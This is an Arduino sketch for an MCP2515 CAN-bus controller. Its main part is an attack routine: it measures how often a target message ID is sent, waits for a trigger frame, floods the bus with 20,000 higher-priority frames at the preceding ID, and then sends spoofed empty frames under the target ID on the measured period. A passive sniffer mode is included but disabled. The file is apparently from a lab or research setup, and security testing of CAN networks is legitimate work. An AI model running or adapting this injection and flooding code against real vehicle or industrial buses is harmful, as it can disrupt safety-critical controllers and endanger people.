#include <mcp_can.h>
#include <SPI.h>

const int SPI_CS_PIN = 4;
MCP_CAN CAN(SPI_CS_PIN);

/*
 * NODE B
 * Send messages with ID=0x11 every 10ms
 */

void setup() {
  Serial.begin(9600);
  // Initialize MCP2515 running at 16MHz with a baudrate of 500kb/s and the masks and filters disabled.
  if (CAN.begin(MCP_ANY, CAN_500KBPS, MCP_16MHZ) == CAN_OK) {
    Serial.println("MCP2515 Initialized Successfully!");
  } else {
    Serial.println("Error Initializing MCP2515...");
  }
  // Set operation mode to normal so the MCP2515 sends acks to received data.
  CAN.setMode(MCP_NORMAL);
}

unsigned long rxId;
byte len = 0;
unsigned char buf[8];


bool done = false;

void loop() {
  // Switch between attack or sniff
  if (true) {
    if (!done) {
      int id = 0x11;//0x11
      long freq = analyzePacketFreq(id, 1000);
      attack(id, freq);
      done = true;
    }
  } else {
    packetSniff();
  }
}

void attack(unsigned long id, int frequency) {
  while (true) {
    // Prova a settare una maschera
    if (CAN_MSGAVAIL == CAN.checkReceive() && CAN_OK == CAN.readMsgBuf(&rxId, &len, buf)) {
      if ((rxId & 0x40000000) == 0x40000000) {
        Serial.println("REMOTE REQUEST FRAME");
      } else if (rxId == 0x09) {
        Serial.print("Attack packet with ID: 0x");
        Serial.print(id < 16 ? "0" : "");
        Serial.print(id, HEX);
        Serial.print(", with frequency: ");
        Serial.print(frequency);
        Serial.println(" ms");
        // Imposta il preceded ID
        //delay(frequency/2);
        unsigned char data[] = { 'X' };
        for(int i = 0; i < 10000; i++) {
          sendMessage(id - 1, 1, data);
          sendMessage(id - 1, 1, data);
        }
        while (true) {
          sendMessage(id, 0, {});
          delay(frequency);
        }
      }
    }
  }
}

void sendMessage(unsigned long id, byte len, unsigned char* buf) {
  byte res = CAN.sendMsgBuf(id, len, buf);
  if (res != CAN_OK) {
    Serial.print("Error sending message 0x");
    Serial.print(id < 16 ? "0" : "");
    Serial.print(id, HEX);
  }
  if (res == CAN_GETTXBFTIMEOUT) {
    Serial.println(", get TX buff time out!");
  } else if (res == CAN_SENDMSGTIMEOUT) {
    Serial.println(", send msg timeout!");
  }
}

long analyzePacketFreq(unsigned long id, int max_count) {
  Serial.println("Start analyze packet...");
  int count = 0;
  long interval = 0, prev_interval = 0;
  long sum_interval = 0;
  while (count < max_count) {
    if (CAN_MSGAVAIL == CAN.checkReceive() && CAN_OK == CAN.readMsgBuf(&rxId, &len, buf)) {
      if (rxId == id && (rxId & 0x40000000) != 0x40000000) {
        interval = millis();
        long delta = interval - prev_interval;
        //Serial.println(delta);
        prev_interval = interval;
        sum_interval += delta;
        count++;
      }
    }
  }
  long delta = sum_interval / max_count;
  Serial.print("Packet with id 0x");
  Serial.print(id, HEX);
  Serial.print(" sent every ");
  Serial.print(delta);
  Serial.println(" ms");
  return delta;
}

void packetSniff() {
  while (true) {
    if (CAN_MSGAVAIL == CAN.checkReceive() && CAN_OK == CAN.readMsgBuf(&rxId, &len, buf)) {
      if ((rxId & 0x40000000) == 0x40000000) {
        Serial.println("REMOTE REQUEST FRAME");
      } else {
        Serial.print("ID: 0x");
        Serial.print(rxId < 16 ? "0" : "");
        Serial.print(rxId, HEX);
        Serial.print("\tDLC: ");
        Serial.print(len);
        Serial.print("\t");
        for (byte i = 0; i < len; i++) {
          Serial.write(buf[i]);
          Serial.print("\t");
        }
        Serial.println();
      }
    }
  }
}


